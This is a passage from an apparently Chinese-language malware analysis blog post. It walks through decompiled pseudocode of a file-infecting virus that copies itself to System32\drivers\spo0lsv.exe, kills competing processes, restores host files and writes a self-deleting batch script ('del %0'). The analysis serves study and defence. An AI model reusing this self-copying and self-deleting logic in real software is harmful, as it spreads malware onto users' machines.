function_">LStrCmp</span><span class="hljs-params">(v6, v10)</span>;<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      v1 = (_DWORD *)sub_405FA4(v13[<span class="hljs-number">2</span>]);<br>      CloseHandle_0(hObject);<br>      <span class="hljs-keyword">goto</span> LABEL_7;<br>    &#125;<br>  &#125;<br>  CloseHandle_0(hObject);<br>  LOBYTE(v1) = <span class="hljs-number">1</span>;<br>LABEL_7:<br>  __writefsdword(<span class="hljs-number">0</span>, v7[<span class="hljs-number">0</span>]);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_4060FD)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v15)</span>;<br>  <span class="hljs-keyword">return</span> v1;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sub-407B68"><a href="#sub-407B68" class="headerlink" title="sub_407B68"></a>sub_407B68</h3><p>此函数的功能为写入bat批处理文件的操作以及启动未被感染的程序，故将名称变更为writebatfile</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">writebatfile</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> _:try1_; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> _:try2_; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> _del_%<span class="hljs-number">0</span>_; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v17; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v18; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">const</span> CHAR *lpCmdLine; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> *ExceptionList; <span class="hljs-comment">// [esp-Ch] [ebp-214h] BYREF</span><br>  <span class="hljs-type">void</span> *v22; <span class="hljs-comment">// [esp-8h] [ebp-210h]</span><br>  <span class="hljs-type">int</span> *v23; <span class="hljs-comment">// [esp-4h] [ebp-20Ch]</span><br>  <span class="hljs-type">int</span> v24; <span class="hljs-comment">// [esp+4h] [ebp-204h] BYREF</span><br>  <span class="hljs-type">int</span> v25[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-1FCh] BYREF</span><br>  <span class="hljs-type">int</span> v26; <span class="hljs-comment">// [esp+14h] [ebp-1F4h] BYREF</span><br>  <span class="hljs-type">int</span> v27; <span class="hljs-comment">// [esp+1Ch] [ebp-1ECh] BYREF</span><br>  <span class="hljs-type">int</span> v28; <span class="hljs-comment">// [esp+24h] [ebp-1E4h] BYREF</span><br>  <span class="hljs-type">int</span> v29; <span class="hljs-comment">// [esp+2Ch] [ebp-1DCh] BYREF</span><br>  <span class="hljs-type">int</span> v30; <span class="hljs-comment">// [esp+30h] [ebp-1D8h] BYREF</span><br>  <span class="hljs-type">int</span> v31; <span class="hljs-comment">// [esp+34h] [ebp-1D4h] BYREF</span><br>  _BYTE v32[<span class="hljs-number">460</span>]; <span class="hljs-comment">// [esp+38h] [ebp-1D0h] BYREF</span><br>  <span class="hljs-type">int</span> v33; <span class="hljs-comment">// [esp+204h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+208h] [ebp+0h] BYREF</span><br><br>  v23 = &amp;savedregs;<br>  v22 = &amp;loc_407E31;<br>  ExceptionList = (<span class="hljs-type">char</span> *)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;ExceptionList);<br>  System::Randomize();<br>  GetTempDir(&amp;v31);                             <span class="hljs-comment">// 临时路径——C:\Users\ADMINI~1\AppData\Local\Temp\</span><br><span class="hljs-comment">  v0 = unknown_libname_39(100);</span><br>  sub_40576C(v0, &amp;v30);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v33, <span class="hljs-number">3</span>)</span>;       <span class="hljs-comment">// 路径拼接&quot;C:\Users\ADMINI~1\AppData\Local\Temp\$$.bat&quot;</span><br>  System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v32, v33)</span>;        <span class="hljs-comment">// 连接</span><br>  *off_40E2BC = <span class="hljs-number">2</span>;<br>  v1 = System::__linkproc__ RewritText(v32);    <span class="hljs-comment">// 写入模式打开，准备写入</span><br>  System::__linkproc__ _IOTest(v1);<br>  _:try1_ = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, (<span class="hljs-type">int</span>)aTry1);<span class="hljs-comment">// &quot;:try1&quot;</span><br>  v3 = System::__linkproc__ WriteLn(_:try1_);<br>  System::__linkproc__ _IOTest(v3);<br>  ExceptionList = aDel;                         <span class="hljs-comment">// &quot;del \&quot;&quot;</span><br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v29, <span class="hljs-number">3</span>)</span>;       <span class="hljs-comment">// 获取本程序路径</span><br>  v4 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, v29);<br>  v5 = System::__linkproc__ WriteLn(v4);<br>  System::__linkproc__ _IOTest(v5);<br>  ExceptionList = aIfExist;                     <span class="hljs-comment">// &quot;if exist \&quot;&quot;</span><br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v28, <span class="hljs-number">4</span>)</span>;       <span class="hljs-comment">// 获取本程序路径</span><br>  v6 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, v28);<br>  v7 = System::__linkproc__ WriteLn(v6);<br>  System::__linkproc__ _IOTest(v7);<br>  ExceptionList = aRen;                         <span class="hljs-comment">// &quot;ren \&quot;&quot;</span><br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  sub_405534(v25[<span class="hljs-number">1</span>], &amp;v26);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v27, <span class="hljs-number">8</span>)</span>;<br>  v8 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, v27);<br>  v9 = System::__linkproc__ WriteLn(v8);<br>  System::__linkproc__ _IOTest(v9);<br>  ExceptionList = aIfExist;                     <span class="hljs-comment">// &quot;if exist \&quot;&quot;</span><br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(v25, <span class="hljs-number">5</span>)</span>;<br>  v10 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, v25[<span class="hljs-number">0</span>]);<br>  v11 = System::__linkproc__ WriteLn(v10);<br>  System::__linkproc__ _IOTest(v11);<br>  ExceptionList = (<span class="hljs-type">char</span> *)::ExceptionList;<br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v24, <span class="hljs-number">3</span>)</span>;<br>  v12 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, v24);<br>  v13 = System::__linkproc__ WriteLn(v12);<br>  System::__linkproc__ _IOTest(v13);<br>  _:try2_ = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, (<span class="hljs-type">int</span>)aTry2);<span class="hljs-comment">// &quot;:try2&quot;</span><br>  v15 = System::__linkproc__ WriteLn(_:try2_);<br>  System::__linkproc__ _IOTest(v15);<br>  _del_%<span class="hljs-number">0</span>_ = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, (<span class="hljs-type">int</span>)aDel0);<span class="hljs-comment">// &quot;del %0&quot;</span><br>  v17 = System::__linkproc__ WriteLn(_del_%<span class="hljs-number">0</span>_);<br>  System::__linkproc__ _IOTest(v17);<br>  v18 = System::__linkproc__ Close(v32);<br>  System::__linkproc__ _IOTest(v18);<br>  ExceptionList = <span class="hljs-number">0</span>;<br>  lpCmdLine = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v33);<br>  WinExec(lpCmdLine, (UINT)ExceptionList);      <span class="hljs-comment">// 运行bat文件</span><br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v22);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_407E38)</span>;<br>  <span class="hljs-keyword">return</span> System::__linkproc__ LStrClr(&amp;v33);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001214541.png"></p><p>于当前目录下生成Desktop_.ini，生成C:\Windows\System32\drivers\spo0lsv.exe（如果本身为C:\Windows\System32\drivers\spo0lsv.exe，则跳过）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c">v35 = &amp;savedregs;<br>  v34[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_408781;<br>  v34[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<span class="hljs-comment">// 设置SEH</span><br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v34);<br>  System::ParamStr(<span class="hljs-number">0</span>);                          <span class="hljs-comment">// 在 Delphi / Borland C++ 这类环境里，ParamStr(0) 是一个函数调用，作用是获取 程序的命令行参数。</span><br>                                                <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">// ParamStr(N) 用来获取第 N 个命令行参数：</span><br>                                                <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">// ParamStr(0) 返回 当前程序自身的完整路径（可执行文件名）。</span><br>                                                <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">// ParamStr(1) 返回 第 1 个命令行参数（如果有）。</span><br>                                                <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">// ParamStr(2) 返回第 2 个参数，以此类推。</span><br>  unknown_libname_89(v55[<span class="hljs-number">1</span>], &amp;System::AnsiString);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(&amp;System::AnsiString, aDesktopIni)</span>;<span class="hljs-comment">// &quot;Desktop_.ini&quot;</span><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)Sysutils::FileExists(System::AnsiString) )<span class="hljs-comment">// 检查当前文件夹下是否存在Desktop_.ini</span><br>  &#123;<br>    System::ParamStr(<span class="hljs-number">0</span>);<br>    unknown_libname_89(v54[<span class="hljs-number">1</span>], v55);<br>    System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(v55, aDesktopIni)</span>;<span class="hljs-comment">// &quot;Desktop_.ini&quot;</span><br>    lpFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v55[<span class="hljs-number">0</span>]);<br>    SetFileAttributesA(lpFileName, <span class="hljs-number">0x80</span>u);      <span class="hljs-comment">// 将文件属性设置成FILE_ATTRIBUTE_NORMAL</span><br>    Sleep(<span class="hljs-number">1u</span>);<br>    System::ParamStr(<span class="hljs-number">0</span>);<br>    unknown_libname_89(v53[<span class="hljs-number">2</span>], v54);<br>    System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(v54, aDesktopIni)</span>;<span class="hljs-comment">// &quot;Desktop_.ini&quot;</span><br>    lpFileName_1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v54[<span class="hljs-number">0</span>]);<br>    DeleteFileA(lpFileName_1);                  <span class="hljs-comment">// 删除当前文件夹下的Desktop_.ini</span><br>  &#125;<br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  sub_407650(v53[<span class="hljs-number">1</span>], &amp;v64, a1, a2, p_Msg);      <span class="hljs-comment">// 读取一参的文件，存放在二参指向的地址中</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v63)</span>;<br>  <span class="hljs-keyword">for</span> ( i = unknown_libname_113(v64); i &gt; <span class="hljs-number">0</span> &amp;&amp; *(_BYTE *)(v64 + i - <span class="hljs-number">1</span>); --i )<span class="hljs-comment">// unknown_libname_113()像是strlen的样子</span><br>  &#123;<br>    unknown_libname_108((<span class="hljs-type">int</span>)v53);<br>    System::__linkproc__ <span class="hljs-title function_">LStrCat3</span><span class="hljs-params">(&amp;v63, v53[<span class="hljs-number">0</span>], v63)</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( !v63 )                                   <span class="hljs-comment">// 如果v63为空，择进入if分支，前面对v63进行了什么操作实在没看出来艹</span><br>  &#123;<br>    System::ParamStr(<span class="hljs-number">0</span>);<br>    Sysutils::AnsiUpperCase(v52[<span class="hljs-number">2</span>]);            <span class="hljs-comment">// 字符变大写</span><br>    n128 = v52[<span class="hljs-number">3</span>];<br>    GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;v51);            <span class="hljs-comment">// 获取C:\Windows\System32\系统路径</span><br>    v32 = v51;<br>    ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)aDrivers;<span class="hljs-comment">// &quot;drivers\\&quot;</span><br>    spo0lsv.exe = spo0lsv_exe;                  <span class="hljs-comment">// &quot;spo0lsv.exe&quot;</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(v52, <span class="hljs-number">3</span>)</span>;      <span class="hljs-comment">// 拼接生成病毒路径C:\Windows\System32\drivers\spo0lsv.exe</span><br>    Sysutils::AnsiUpperCase(v52[<span class="hljs-number">0</span>]);            <span class="hljs-comment">// 病毒路径转大写</span><br>    System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(n128, v52[<span class="hljs-number">1</span>])</span>; <span class="hljs-comment">// 比较病毒生成路径和程序运行路径是否相等，不一致时于系统目录创建样本</span><br>    <span class="hljs-keyword">if</span> ( !v6 )<br>    &#123;<br>      VirusKiller((<span class="hljs-type">int</span>)spo0lsv_exe);            <span class="hljs-comment">// kill掉&quot;spo0lsv.exe&quot;进程</span><br>      VirusKiller((<span class="hljs-type">int</span>)spo0lsv_exe);            <span class="hljs-comment">// &quot;spo0lsv.exe&quot;</span><br>      n128 = <span class="hljs-number">128</span>;<br>      GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;v49);          <span class="hljs-comment">// 获取C:\Windows\System32\系统路径</span><br>      v32 = v49;<br>      ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)aDrivers;<span class="hljs-comment">// &quot;drivers\\&quot;</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v50, <span class="hljs-number">3</span>)</span>;   <span class="hljs-comment">// 拼接生成病毒路径C:\Windows\System32\drivers\spo0lsv.exe</span><br>      n5 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v50);<span class="hljs-comment">// 字符串类型转换</span><br>      SetFileAttributesA(n5, (DWORD)spo0lsv_exe);<span class="hljs-comment">// &quot;spo0lsv.exe&quot;</span><br>      Sleep(<span class="hljs-number">1u</span>);                                <span class="hljs-comment">// 休眠</span><br>      spo0lsv.exe = <span class="hljs-number">0</span>;<br>      GetSystemDirectory(&amp;n9);                  <span class="hljs-comment">// 获取C:\Windows\System32\系统路径</span><br>      n10 = n9;<br>      drivers__ = aDrivers;                     <span class="hljs-comment">// &quot;drivers\\&quot;</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v48, <span class="hljs-number">3</span>)</span>;   <span class="hljs-comment">// 拼接生成病毒路径C:\Windows\System32\drivers\spo0lsv.exe</span><br>      n1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v48);<span class="hljs-comment">// 字符串类型转换</span><br>      System::ParamStr(<span class="hljs-number">0</span>);<br>      n2 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v46[<span class="hljs-number">1</span>]);<span class="hljs-comment">// 程序执行路径字符串类型转换</span><br>      CopyFileA(n2, n1, (BOOL)spo0lsv_exe);     <span class="hljs-comment">// 把病毒程序从运行路径复制为C:\Windows\System32\drivers\</span><br><span class="hljs-comment">                                                // spo0lsv.exe，并设置FailIfExists=false,即如果目标文件存在则覆盖</span><br>      ExceptionList_1 = <span class="hljs-number">1</span>;<br>      GetSystemDirectory(&amp;v45);                 <span class="hljs-comment">// 获取C:\Windows\System32\系统路径</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(v46, <span class="hljs-number">3</span>)</span>;    <span class="hljs-comment">// 拼接生成病毒路径C:\Windows\System32\drivers\spo0lsv.exe</span><br>      n3 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v46[<span class="hljs-number">0</span>]);<span class="hljs-comment">// 字符串类型转换</span><br>      WinExec(n3, (UINT)spo0lsv_exe);           <span class="hljs-comment">// 运行C:\Windows\System32\drivers\spo0lsv.exe</span><br>      ExitProcess_0(<span class="hljs-number">0</span>);                         <span class="hljs-comment">// 结束进程</span><br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>若运行程序为源病毒程序，删除源病毒程序，重新生成C:\Windows\System32\drivers\spo0lsv.exe</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !(<span class="hljs-type">unsigned</span> __int8)sub_405458(spo0lsv_exe) )<span class="hljs-comment">// 判断当前进程是否是源病毒，如果是，则进入</span><br>    &#123;<br>      n128 = <span class="hljs-number">128</span>;<br>      GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;v42);          <span class="hljs-comment">// 获取C:\Windows\System32\系统路径</span><br>      v32 = v42;<br>      ExceptionList = (<span class="hljs-keyword">struct</span> _EXCEPTION_REGISTRATION_RECORD *)aDrivers;<span class="hljs-comment">// &quot;drivers\\&quot;</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v43, <span class="hljs-number">3</span>)</span>;<br>      lpFileName_2 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v43);<br>      SetFileAttributesA(lpFileName_2, (DWORD)spo0lsv_exe);<span class="hljs-comment">// 设置spo0lsv.exe属性</span><br>      Sleep(<span class="hljs-number">1u</span>);                                <span class="hljs-comment">// 休眠</span><br>      GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;uCmdShow);     <span class="hljs-comment">// 获取C:\Windows\System32\系统路径</span><br>      spo0lsv.exe = (<span class="hljs-type">char</span> *)uCmdShow;<br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v41, <span class="hljs-number">3</span>)</span>;   <span class="hljs-comment">// 拼接生成病毒路径C:\Windows\System32\drivers\spo0lsv.exe</span><br>      lpFileName_3 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v41);<span class="hljs-comment">// 格式转换</span><br>      DeleteFileA(lpFileName_3);                <span class="hljs-comment">// 删除源病毒</span><br>      n14 = unknown_libname_113(v64);           <span class="hljs-comment">// 获取源病毒大小</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrDelete</span><span class="hljs-params">(&amp;v64, n14 - v59, v59)</span>;<br>      n10 = unknown_libname_113(v64);           <span class="hljs-comment">// 获取源病毒大小</span><br>      v19 = unknown_libname_113(v64);<br>      System::__linkproc__ <span class="hljs-title function_">LStrDelete</span><span class="hljs-params">(&amp;v64, v19, n10)</span>;<br>      System::__linkproc__ <span class="hljs-title function_">LStrLAsg</span><span class="hljs-params">(&amp;v61, v64)</span>; <span class="hljs-comment">// 获取字符串信息</span><br>      n10 = (<span class="hljs-type">int</span>)&amp;savedregs;<br>      drivers__ = (<span class="hljs-type">char</span> *)&amp;loc_408730;<br>      ExceptionList_1 = (<span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>      __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;ExceptionList_1);<br>      GetSystemDirectory(&amp;v38);                 <span class="hljs-comment">// 获取C:\Windows\System32\系统路径</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v39, <span class="hljs-number">3</span>)</span>;   <span class="hljs-comment">// 拼接生成病毒路径C:\Windows\System32\drivers\spo0lsv.exe</span><br>      System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v57, v39)</span>;<br>      *off_40E2BC = <span class="hljs-number">2</span>;<br>      n15 = System::__linkproc__ RewritText(v57);<span class="hljs-comment">// 以写入模式打开C:\Windows\System32\drivers\spo0lsv.exe</span><br>      System::__linkproc__ _IOTest(n15);<br>      n16 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v57, v61);<span class="hljs-comment">// 以附加模式写入</span><br>      v22 = System::__linkproc__ Flush(n16);<br>      System::__linkproc__ _IOTest(v22);<br>      v23 = System::__linkproc__ Close(v57);<br>      System::__linkproc__ _IOTest(v23);<br>      n10 = <span class="hljs-number">1</span>;<br>      GetSystemDirectory((<span class="hljs-type">int</span> *)&amp;drivers___1);  <span class="hljs-comment">// 获取C:\Windows\System32\系统路径</span><br>      drivers__ = drivers___1;<br>      ExceptionList_1 = (<span class="hljs-type">int</span>)aDrivers;          <span class="hljs-comment">// &quot;drivers\\&quot;</span><br>      System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v37, <span class="hljs-number">3</span>)</span>;   <span class="hljs-comment">// 拼接生成病毒路径C:\Windows\System32\drivers\spo0lsv.exe</span><br>      n4 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v37);<span class="hljs-comment">// 字符串类型转换</span><br>      WinExec(n4, (UINT)spo0lsv.exe);           <span class="hljs-comment">// 运行病毒程序</span><br>      __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)ExceptionList);<br>    &#125;<br>    ExitProcess_0(<span class="hljs-number">0</span>);                           <span class="hljs-comment">// 退出</span><br></code></pre></td></tr></table></figure><p>若运行程序为被感染程序，将源文件从被感染的文件中提取出来并覆写被感染的文件。于临时目录生成bat批处理文件，删除被感染的文件，直接结束进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">n11 = unknown_libname_113((<span class="hljs-type">int</span>)v63);          <span class="hljs-comment">// 如果运行的是被感染的程序，并非源病毒程序，走这个分支</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrDelete</span><span class="hljs-params">(&amp;v64, i, 